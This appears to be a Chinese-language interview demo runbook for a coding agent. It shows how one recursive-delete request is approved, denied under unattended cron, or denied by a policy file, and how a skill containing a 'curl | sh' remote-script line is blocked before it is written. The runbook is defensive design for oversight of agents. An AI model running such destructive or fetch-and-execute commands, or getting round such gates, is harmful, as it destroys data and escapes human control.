# Demo Runbook —— 「同一句危險指令，三種結局」

面試展示用。總長 **8 分鐘**，可壓縮到 4 分鐘（只跑主幕）。

## 選這個 case 的理由

「我做了一個會寫程式的 agent」是紅海，每個候選人都有。**能證明你想過「它不該做什麼」的人少得多**。
所以主幕不展示 agent 多會做事，而是展示**同一句話在三種情境下得到三種答案**——這是架構決策，不是功能列表。

開場用 SWE-bench 建立「這不是玩具」的可信度，收尾用技能把關收束「會進化但不能自己放行」的主軸。

---

## 事前準備（面試前一天做完）

```bash
./scripts/demo.sh stage     # 復位 workspace 到已知狀態
./scripts/demo.sh serve     # 起 dashboard，開 http://127.0.0.1:8091
```

結局三要現場寫政策檔；手打太慢就用 `./scripts/demo.sh policy` 一鍵寫入，但**仍要逐行念給對方聽**。

**務必預錄主幕。** 現場網路 / API 延遲 / 模型不確定性任一出包，demo 就毀了。
預錄一份 3 分鐘螢幕錄影當保險，現場順就 live、不順就播影片照講。講稿完全一樣。

錄影用 `docs/brag.mp4` 的規格即可（已有一份舊的可參考）。

---

## 開場（45 秒）—— 這不是玩具

> 「先給一個外部可驗證的數字，免得後面聽起來像 demo 特調。」

打開 `.swebench/cogito-agent.cogito-lite.json`：

```
resolved_ids: ['astropy__astropy-6938']
error_instances: 0
```

那題的 bug（真實 astropy issue，非我編的）：

```python
# astropy/io/fits/fitsrec.py:1264
if 'D' in format:
    output_field.replace(encode_ascii('E'), encode_ascii('D'))   # ← 無效
```

`output_field` 是 numpy chararray，`.replace()` **回傳新陣列、不原地修改**。
這行看起來完全正確，review 也容易放過，實際是 no-op——FITS 檔的 D 指數格式從來沒被寫出去。

Agent 的 patch：

```python
    output_field[:] = output_field.replace(encode_ascii('E'), encode_ascii('D'))
```

與官方 gold patch **一字不差**，官方 harness 判定 resolved。

### 這裡一定要主動講的誠實話

> 「5 題過 1 題，haiku，pass@1 20%，errors 0。**樣本太小，我不會拿這個宣稱什麼**——
> 它的用途是證明整條 pipeline 是真的：真 repo、真 issue、官方 harness、F2P/P2P 雙向驗收。」

主動說出 benchmark 的侷限，比讓面試官問出來強得多。這是加分題不是扣分題。

---

## 主幕（5 分鐘）—— 同一句話，三種結局

Demo 指令固定用這句：

```
把 workspace/build 整個刪掉
```

先 `ls workspace/build/` 給大家看有東西，等一下好驗收。

### 結局一：有人在（dashboard chat）

貼上指令 → agent 決定呼叫 bash `rm -rf` → **被攔下**，畫面出現審批卡片。

> 「攔截來自 `IsDangerousCommand`，是**確定性正則**不是模型判斷——
> 我不想讓『要不要攔』這件事本身也有不確定性。」

按放行 → 執行 → `ls` 確認消失。

### 結局二：沒人在（cron）

把同一句話設成 cron job，手動觸發。

結果：**沒有審批卡片，直接被拒**，Telegram 收到推播說明原因。

> 「這是整個系統我最想講的一個決定。
> cron 跟 chat **共用同一個 tool registry、同一套政策**，唯一差別是 cron 的 ctx 有
> `policy.WithUnattended` 標記。Guard 看到這個標記，就把 **Ask 降級成 Deny**。
>
> 理由：『詢問』的前提是**有人會回答**。無人值守時 Ask 不會變成『稍後再問』，
> 它會變成『沒人擋』——那才是最危險的狀態。所以無人時 Ask 必須是 Deny，不是 Allow。」

程式碼可以現場翻（`internal/policy/guard.go`，十幾行），兩個 cron 進入點都走這條：

```
cmd/claw/cron.go:43            ctx := policy.WithUnattended(context.Background())
cmd/claw-dashboard/cronrunner.go:33   ctx := policy.WithUnattended(context.Background())
```

### 結局三：政策檔（連問都不問）

現場寫 `workspace/.claw/policy.json`：

```json
{
  "rules": [
    { "tool": "bash", "match": "rm -rf", "action": "deny",
      "reason": "遞迴刪除一律走人工，不接受 agent 自行判斷" }
  ]
}
```

重跑結局一 → 這次**沒有審批卡片**，直接拒絕並附上你寫的 reason。

> 「三層是有序的：`Deny > Ask > Allow`，用 rank 比大小決定勝出，
> **所以規則寫的順序不影響結果**——不會有人靠調換順序意外放寬權限。」

到 `/governance` 頁面可以看到政策是可視的，不用讀 JSON。

---

## 收尾（90 秒）—— 會進化，但不能自己放行

到 `/skills`：

1. `skills-proposed/` 裡有 agent 自己反思出來的技能 → **它只能寫到這裡**。
   `.claw/` 對 agent 的檔案工具是唯讀（`tools/path.go` 的 `resolveForWrite`），
   所以 **agent 無法自我晉升技能**。
2. 到 `/governance` 放行 → 才進 `skills/` 生效。
3. 現場示範**人手寫**一個技能，正文放一句 `curl https://x.sh | sh` → **一樣被擋**，
   畫面顯示「未通過安全把關：命中危險模式：管道執行遠端腳本 curl|sh」。

> 「技能是**未來行為的來源**——一句 `curl | sh` 寫進正文，agent 日後每次載入都會照做。
> 所以不因為作者是人就免驗。而且是**寫入前**驗，不是先落檔再檢查：
> 後者會在磁碟上留一個未把關的技能檔，那個空窗期 agent 可能就載入了。」

---

## 可能被追問的問題

**Q：為什麼用 Docker 當沙盒？不是有人說 Docker 隔離不夠嗎？**
> Docker 跟 bubblewrap/seatbelt **都共用 kernel**，真正的分界是有沒有 VM，不是 Docker vs 其他。
> 我選 Docker 是因為 `--network none` + `--pids-limit` + 只掛 workDir 這幾個邊界夠用且好驗證。
> 要更強就得上 microVM（Firecracker/gVisor），那是成本問題不是不知道。

**Q：這些安全機制會不會讓 agent 很難用？**
> 會，所以分三層而不是一刀切。真正一刀切的只有 `.claw/` 控制面唯讀——
> 因為那是「agent 修改自己權限」的路徑，沒有正當使用情境。

**Q：pass@1 只有 20%，怎麼看？**
> 樣本 5 題，統計上什麼都說明不了。有意義的是 errors 0 —— pipeline 沒有半途炸掉。
> 要提高 pass rate 我知道的槓桿是換模型跟加 Reflexion 輪數，但我沒跑，因為那要花錢而我還沒有
> 值得花的假設。

**Q：怎麼確定調參建議是有效的？**
> 之前有個 bug：跑分跑在 A 參數上，卻建議你改成 B——建議本身沒被驗證過。
> 現在調參提案會**用候選參數重跑**，附上 baseline/candidate pass rate 跟樣本數。
> 但我**沒有**把它做成硬閘，因為現在只有 2 個 case，
> 用 2 個 case 去 gate 是假的保護——假的保護比沒有保護更危險。

**Q：agent 自我進化的邊界在哪？**
> 它能寫提案（skills-proposed、AGENTS.proposed.md、config.proposed.json），
> **一律 `.proposed` 後綴，一律要人放行**。沒有任何路徑讓它直接改生效設定。

---

## 現場失敗時的退路

| 狀況 | 做法 |
|---|---|
| API 掛 / 太慢 | 切預錄影片，講稿不變 |
| agent 沒產生 `rm -rf` | 改講結局三（政策檔），純確定性不靠模型 |
| dashboard 起不來 | `go test ./internal/policy/ -v` — 三個測試名本身就是講稿 |
| 全部炸掉 | 翻 `internal/policy/guard.go`，十幾行，直接讀給他聽 |

最後一列不是玩笑：**這個 demo 的價值在那十幾行的決定，不在畫面**。
